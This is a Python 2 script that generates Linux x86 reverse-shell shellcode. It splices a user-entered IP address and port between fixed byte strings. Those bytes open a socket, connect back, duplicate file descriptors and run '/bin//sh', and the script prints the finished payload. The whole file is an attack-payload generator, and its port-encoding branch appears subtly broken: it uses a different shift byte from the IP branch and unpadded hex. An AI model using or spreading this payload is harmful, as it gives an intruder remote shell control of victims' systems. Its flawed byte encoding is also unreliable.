#!/usr/bin/python


shellcode1 = ("\\x31\\xdb\\xf7\\xe3\\x50\\x0c\\x66\\x43\\x53\\x6a"
"\\x02\\x89\\xe1\\xcd\\x80\\x97")

# Original code

# "\x04\x01\xc1\xe0\x08\x04\x00\xc1\xe0\x08\x04\x00\xc1\xe0\x08\x04\x7f\x50\x31\xc0\x04\x5c\xc1\xe0\x08\x04\x11\x66\x50

# 04 01                   add    al,0x1
# c1 e0 08                shl    eax,0x8
# 04 00                   add    al,0x0
# c1 e0 08                shl    eax,0x8
# 04 00                   add    al,0x0
# c1 e0 08                shl    eax,0x8
# 04 7f                   add    al,0x7f
# 50                      push   eax

# 31 c0                   xor    eax,eax
# 04 5c                   add    al,0x5c
# c1 e0 08                shl    eax,0x8
# 04 11                   add    al,0x11
# 66 50                   push   ax

variable_part = ""

shellcode2 = ("\\x66\\x6a\\x02\\x89\\xe1\\x31\\xc0\\x0c\\x66\\x80"
"\\xc3\\x02\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x80"
"\\xc1\\x02\\x31\\xc0\\x04\\x3f\\xcd\\x80\\x49\\x79\\xf7\\x31\\xc0"
"\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3"
"\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")

shellcodeLen = 75


str_ip = raw_input("Enter IP address: ")

ipList = str_ip.split('.')

for i in range(0, 4):
	tmp1 = int(ipList[3-i])
	if tmp1 != 0:
		# Add IP part, as it is not 0
		tmp2 = ""
		if tmp1 < 16:
			tmp2 += "0"
		tmp2 += hex(tmp1)[2:]
	
		variable_part += "\\x04" + "\\x" + tmp2
		shellcodeLen += 2

	if i != 3:
		# Shift left with 8 bits
		variable_part += "\\xc1\\xe0\\x08"
		shellcodeLen += 3

# push eax onto the stack
variable_part += "\\x50"
shellcodeLen += 1


str_port = raw_input("Enter port number: ")

portnum = int(str_port)
if portnum < 1 or portnum > 65535:
	print "Invalid range"
else:
	upper = portnum % 256
	lower = portnum / 256

	# set eax to 0
	variable_part += "\\x31\\xc0"
	shellcodeLen += 2

	if lower == 0:
		# add lower byte
		upperHex = "\\" + hex(upper)[1:]
		variable_part += ("\\x04" + upperHex)

		# shift left with 8
		variable_part += "\\xc1\\xe0\\xe8"

		shellcodeLen += 5
	else:
		# add upper byte
		upperHex = "\\" + hex(upper)[1:]
		variable_part += ("\\x04" + upperHex)

		# shift left with 8
		variable_part += "\\xc1\\xe0\\xe8"

		# add lower byte
		lowerHex = "\\" + hex(lower)[1:]
		variable_part += ("\\x04" + lowerHex)

		shellcodeLen += 7

# push ax onto the stack
variable_part += "\\x66\\x50"
shellcodeLen += 2


print ""
print "Length of shellcode: %d bytes" % (shellcodeLen)
print ""
print "Shellcode: \"" + shellcode1 + variable_part + shellcode2 + "\""
print ""
